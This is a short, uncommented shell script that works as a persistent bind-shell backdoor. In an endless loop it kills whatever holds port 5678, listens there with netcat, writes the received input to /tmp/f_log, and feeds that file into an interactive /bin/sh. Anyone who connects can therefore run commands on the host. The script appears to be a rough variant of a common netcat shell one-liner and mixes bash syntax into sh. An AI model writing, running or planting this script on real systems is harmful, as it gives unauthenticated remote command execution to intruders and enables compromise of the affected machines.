#!/bin/sh

while true
do
echo 'new start'
process_id_log=$(lsof -i | grep 5678)
to_kill_log=$(echo $process_id_log | awk '{print $2}')
echo 'to kill:' $to_kill_log
if [[ !  -z  $to_kill_log  ]];then
	kill -9 $to_kill_log
fi
rm -f /tmp/f_log; #mkfifo /tmp/f_log 
nc -l 5678 > /tmp/f_log 
cat /tmp/f_log | /bin/sh -i 2>&1
done 
